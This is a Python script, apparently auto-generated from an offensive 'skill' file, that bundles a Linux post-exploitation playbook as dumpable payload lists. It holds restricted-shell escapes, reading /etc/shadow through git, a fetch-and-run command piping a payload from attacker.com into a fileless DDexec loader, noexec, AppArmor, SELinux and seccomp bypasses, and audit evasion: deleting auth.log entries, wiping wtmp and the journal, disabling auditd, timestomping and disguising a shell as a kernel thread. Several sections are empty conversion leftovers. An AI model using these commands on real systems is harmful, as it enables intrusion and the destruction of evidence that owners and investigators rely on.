#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/linux-security-bypass

Skill: SKILL: Linux Security Bypass — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-linux-security-bypass.py --help
      python hack-skills-linux-security-bypass.py --list
      python hack-skills-linux-security-bypass.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/linux-security-bypass'
TITLE = 'SKILL: Linux Security Bypass — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: linux-security-bypass", "description: >-", "Linux security mechanism bypass playbook. Use when facing restricted bash/rbash, read-only or noexec filesystems, AppArmor, SELinux, seccomp filters, or audit logging that must be evaded during post-exploitation."],
    'skill-linux-security-bypass-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) once you've broken out of restrictions and need to escalate", "- [container-escape-techniques](../container-escape-techniques/SKILL.md) when security mechanisms are container-specific (seccomp profiles, AppArmor docker-default)", "- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) after bypassing restrictions for pivoting", "- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) when the restriction is on command execution from a web application context"],
    '1-restricted-bash-rbash-bypass': [],
    '1-1-ssh-based-bypass': ["```bash"],
    'force-a-different-shell-via-ssh': ["ssh user@host -t \"bash --noprofile --norc\"", "ssh user@host -t \"/bin/sh\"", "ssh user@host -t \"bash -l\""],
    'if-forcecommand-is-set-in-sshd-config-these-may-not-work': [],
    'try-sftp-scp-instead-often-not-restricted': ["sftp user@host"],
    'sftp-shell-can-sometimes-execute-commands': [],
    '1-2-editor-based-escape': ["```bash"],
    'vi-vim-escape': [":set shell=/bin/bash", ":shell"],
    'or-bin-bash': [],
    'ed-escape': ["!/bin/bash"],
    'nano-if-available': [],
    'ctrl-r-ctrl-x-command-execution': [],
    '1-3-language-interpreter-escape': [],
    '1-4-environment-variable-tricks': ["```bash"],
    'overwrite-shell-via-bash-cmds': ["BASH_CMDS[x]=/bin/bash"],
    'use-env-to-spawn-unrestricted-shell': ["env /bin/bash", "env -i /bin/bash"],
    'path-manipulation-if-export-is-allowed': ["export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "/bin/bash"],
    'if-only-specific-commands-are-allowed': [],
    'use-allowed-command-to-read-files': ["git log --oneline --all -p    # git can read arbitrary files", "git diff /dev/null /etc/shadow"],
    '1-5-other-escapes': [],
    '2-read-only-noexec-filesystem-execution': [],
    '2-1-ddexec-execute-from-stdin-via-proc-self-mem': ["```bash"],
    'ddexec-overwrites-the-running-process-memory-with-a-new-binary': [],
    'no-file-written-to-disk-completely-fileless': [],
    'usage-pipe-any-elf-binary-through-ddexec': ["curl -sL https://attacker.com/payload | bash ddexec.sh"],
    'how-it-works': [],
    '1-opens-proc-self-mem-for-writing': [],
    '2-seeks-to-the-text-segment-of-the-current-process': [],
    '3-overwrites-it-with-the-target-elf-binary': [],
    '4-jumps-to-the-new-entry-point': [],
    '2-2-memfd-create-in-memory-file-descriptor': ["```python", "import ctypes, os", "libc = ctypes.CDLL(\"libc.so.6\")", "fd = libc.syscall(319, b\"\", 0)     # SYS_MEMFD_CREATE (x86_64)", "with open(f\"/proc/self/fd/{fd}\", \"wb\") as f:", "f.write(open(\"/path/to/binary\", \"rb\").read())", "os.execve(f\"/proc/self/fd/{fd}\", [\"binary\"], os.environ)   # Bypasses noexec", "```bash"],
    'perl-variant-syscall-319-0-write-to-fd-exec-proc-fd-fd': [],
    '2-3-ld-so-direct-execution': ["```bash"],
    'use-the-dynamic-linker-to-execute-from-a-writable-mount': [],
    'even-if-the-binary-s-partition-is-noexec-ld-so-runs-from-its-own-mount': ["/lib64/ld-linux-x86-64.so.2 /path/on/noexec/mount/binary"],
    'or-from-dev-shm-usually-writable-exec': ["cp binary /dev/shm/binary", "/dev/shm/binary"],
    '2-4-script-interpreters-on-noexec': ["```bash"],
    'scripts-still-execute-on-noexec-only-elf-execution-is-blocked': [],
    'the-interpreter-python-perl-bash-runs-from-an-exec-allowed-mount': [],
    'and-reads-the-script-as-data': ["python3 /noexec/mount/exploit.py      # Works", "perl /noexec/mount/exploit.pl         # Works", "bash /noexec/mount/exploit.sh         # Works"],
    'but-exploit-elf-binary-permission-denied': [],
    '2-5-writable-mount-points': ["```bash"],
    'common-writable-exec-capable-locations': ["/dev/shm        # tmpfs \u2014 almost always writable + exec", "/tmp            # Sometimes noexec on hardened systems", "/var/tmp        # Often writable", "/run            # tmpfs \u2014 check permissions"],
    'check-mount-options': ["mount | grep -E \"shm|tmp\""],
    'look-for-noexec-flag-if-absent-exec-is-allowed': [],
    '3-apparmor-bypass': [],
    '3-1-profile-enumeration': ["```bash"],
    'check-apparmor-status': ["aa-status 2>/dev/null", "cat /sys/module/apparmor/parameters/enabled     # Y = enabled", "cat /sys/kernel/security/apparmor/profiles      # List all profiles"],
    'check-current-process-profile': ["cat /proc/self/attr/current"],
    'unconfined-no-restriction': [],
    'docker-default-enforce-docker-s-default-profile': [],
    '3-2-exploitation-strategies': ["```bash"],
    'find-unconfined-processes-inject-via-ptrace-if-root': ["ps auxZ 2>/dev/null | grep unconfined"],
    'complain-mode-effectively-no-restriction-just-logging': ["aa-status | grep complain", "Common AppArmor profile gaps: `/proc/self/fd/*` access, abstract Unix sockets, interpreter-based execution (python scripts bypass binary restrictions), and newly created paths."],
    '4-selinux-bypass': [],
    '4-1-mode-check': ["```bash", "getenforce           # Enforcing / Permissive / Disabled", "sestatus             # Detailed status", "cat /etc/selinux/config   # Persistent configuration"],
    'check-current-context': ["id -Z", "ps auxZ | head -20"],
    '4-2-permissive-domain-exploitation': ["```bash", "semanage permissive -l 2>/dev/null    # Domains in permissive mode", "ps -eZ | grep -i permissive           # Processes \u2014 can do anything (just logged)"],
    '4-3-context-transition-booleans': ["```bash", "ls -Z /tmp/                           # File contexts \u2014 tmp_t has broader access", "sesearch --allow -t unconfined_t 2>/dev/null | head -30   # Transition rules"],
    'dangerous-booleans-that-weaken-selinux': ["getsebool -a | grep -i \"on$\" | grep -iE \"exec|write|network|connect\""],
    'httpd-can-network-connect-allow-execmem': [],
    '5-seccomp-bypass': [],
    '5-1-check-seccomp-status': ["```bash", "grep Seccomp /proc/self/status"],
    'seccomp-0-disabled-1-strict-2-filter': [],
    'docker-default-seccomp-profile-blocks-44-syscalls': [],
    'check-what-s-allowed': ["./amicontained    # Shows blocked/allowed syscalls"],
    '5-2-architecture-confusion-x86-vs-x86-64': ["```bash"],
    'seccomp-filters-often-only-check-x86-64-syscall-numbers': [],
    'x86-32-bit-syscall-numbers-are-different': [],
    'if-the-filter-doesn-t-check-the-architecture': [],
    'compile-a-32-bit-binary-that-uses-x86-syscall-numbers': [],
    'x86-64-execve-59-x86-execve-11': [],
    'the-filter-blocks-syscall-59-but-not-11': ["gcc -m32 -static -o exploit32 exploit.c"],
    'if-the-seccomp-filter-lacks-audit-arch-x86-check-bypass': [],
    '5-3-allowed-syscall-abuse-kernel-bugs': ["Allowed syscalls to abuse creatively: `sendmsg/recvmsg` (pass FDs between processes), `mmap/mprotect` (executable memory), `process_vm_readv/writev` (cross-process memory).", "Known seccomp kernel bugs: CVE-2019-2054 (ptrace bypass), io_uring bypassed seccomp entirely (pre-5.12). Check `uname -r` and compare."],
    '6-audit-evasion': [],
    '6-1-timestamp-manipulation': ["```bash"],
    'modify-file-timestamps-to-hide-changes': ["touch -r /etc/hosts /modified/file          # Copy timestamp from reference", "touch -t 202301010000.00 /modified/file     # Set specific timestamp"],
    'modify-log-timestamps-if-writable': [],
    'use-timestomping-to-match-surrounding-entries': [],
    '6-2-log-tampering-process-spoofing': ["```bash", "sed -i '/pattern/d' /var/log/auth.log     # Remove specific entries", "echo \"\" > /var/log/wtmp                    # Clear login records", "journalctl --rotate && journalctl --vacuum-time=1s   # Clear journal"],
    'process-name-spoofing-hide-in-ps-output': ["exec -a \"[kworker/0:0]\" /bin/bash          # Bash"],
    'c-python-prctl-pr-set-name-kworker-0-0-0-0-0': [],
    'disable-audit-if-root': ["auditctl -e 0 && service auditd stop"],
    '7-linux-security-bypass-decision-tree': ["Security mechanism identified?", "\u251c\u2500\u2500 Restricted shell (rbash)?", "\u2502   \u251c\u2500\u2500 SSH access? \u2192 ssh -t \"bash --noprofile --norc\" (\u00a71.1)", "\u2502   \u251c\u2500\u2500 Editor available? \u2192 vi :!/bin/bash (\u00a71.2)", "\u2502   \u251c\u2500\u2500 Language interpreter? \u2192 python/perl/ruby escape (\u00a71.3)", "\u2502   \u251c\u2500\u2500 env command? \u2192 env /bin/bash (\u00a71.4)", "\u2502   \u2514\u2500\u2500 Allowed commands with escape? \u2192 git/man/less \u2192 !bash (\u00a71.5)", "\u251c\u2500\u2500 noexec filesystem?", "\u2502   \u251c\u2500\u2500 Script interpreters available? \u2192 bash/python/perl scripts work (\u00a72.4)", "\u2502   \u251c\u2500\u2500 /dev/shm writable + exec? \u2192 copy binary there (\u00a72.5)", "\u2502   \u251c\u2500\u2500 memfd_create available? \u2192 fileless execution (\u00a72.2)", "\u2502   \u251c\u2500\u2500 ld.so accessible? \u2192 ld.so /path/to/binary (\u00a72.3)", "\u2502   \u2514\u2500\u2500 Last resort \u2192 DDexec via /proc/self/mem (\u00a72.1)", "\u251c\u2500\u2500 AppArmor enforcing?", "\u2502   \u251c\u2500\u2500 Profile in complain mode? \u2192 no restriction, just logging (\u00a73.3)", "\u2502   \u251c\u2500\u2500 Unconfined processes exist? \u2192 inject/migrate to them (\u00a73.2)", "\u2502   \u251c\u2500\u2500 Profile missing path coverage? \u2192 use uncovered paths (\u00a73.4)", "\u2502   \u2514\u2500\u2500 Interpreter not restricted? \u2192 script-based execution", "\u251c\u2500\u2500 SELinux enforcing?", "\u2502   \u251c\u2500\u2500 Domain set to permissive? \u2192 exploit that domain (\u00a74.2)", "\u2502   \u251c\u2500\u2500 Dangerous booleans enabled? \u2192 abuse allowed actions (\u00a74.4)", "\u2502   \u251c\u2500\u2500 Context transition available? \u2192 execute binary with transition (\u00a74.3)", "\u2502   \u2514\u2500\u2500 Kernel CVE? \u2192 SELinux bypass exploit", "\u251c\u2500\u2500 seccomp filter active?", "\u2502   \u251c\u2500\u2500 Architecture check missing? \u2192 32-bit syscall confusion (\u00a75.2)", "\u2502   \u251c\u2500\u2500 Allowed syscalls exploitable? \u2192 sendmsg/mmap abuse (\u00a75.3)", "\u2502   \u251c\u2500\u2500 Kernel bug? \u2192 io_uring/ptrace bypass (\u00a75.4)", "\u2502   \u2514\u2500\u2500 Check what's blocked \u2192 amicontained (\u00a75.1)", "\u2514\u2500\u2500 Audit logging?", "\u251c\u2500\u2500 Writable logs? \u2192 delete/modify entries (\u00a76.2)", "\u251c\u2500\u2500 Root access? \u2192 disable auditd (\u00a76.4)", "\u251c\u2500\u2500 Need stealth? \u2192 process name spoofing (\u00a76.3)", "\u2514\u2500\u2500 File changes tracked? \u2192 timestamp manipulation (\u00a76.1)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()